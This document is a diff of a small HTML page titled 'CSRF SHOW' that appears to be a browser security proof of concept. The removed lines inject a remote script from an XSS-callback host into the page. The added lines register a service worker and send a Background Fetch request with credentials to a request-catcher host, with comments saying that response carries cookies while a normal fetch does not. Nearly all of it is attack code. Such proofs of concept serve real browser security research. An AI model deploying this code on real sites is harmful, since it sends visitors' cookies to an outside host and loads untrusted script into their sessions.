@@ -1,23 +1,25 @@
 <!DOCTYPE HTML>
 <html lang="en-US">
 <head>
-<title>CSRF SHOW</title>
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <title>CSRF SHOW</title>
 </head>
-     <body>
-          <iframe src="/csrf.html"></iframe>
-     </body>
-	 <script>
-	 document.querySelector("iframe").addEventListener( "load", function(e) {
+<script>
+  const url = "https://shamanjd.requestcatcher.com/";
 
-    this.style.backgroundColor = "red";
-    
+  navigator.serviceWorker.ready.then(async (swReg) => {
+    const request = new Request(url, { credentials: "include" });
 
-    var img = document.createElement("script");
-img.src = "https://qazqazqaz.xss.ht";
-var src = document.getElementsByTagName('body')[0];
-src.appendChild(img);
+    const bgFetch = await swReg.backgroundFetch.fetch("test", [request]);
 
-} );
-	 </script>
+    const targetPage = await bgFetch.match(url);
+    const response = await targetPage.responseReady;
+    console.log("Background Fetch:", await response.text()); // contains cookie
+
+    const normalFetch = await fetch(request);
+    console.log("Fetch:", await normalFetch.text()); // no cookie
+  });
+
+  navigator.serviceWorker.register("sw.js");
+</script>
+
 </html>
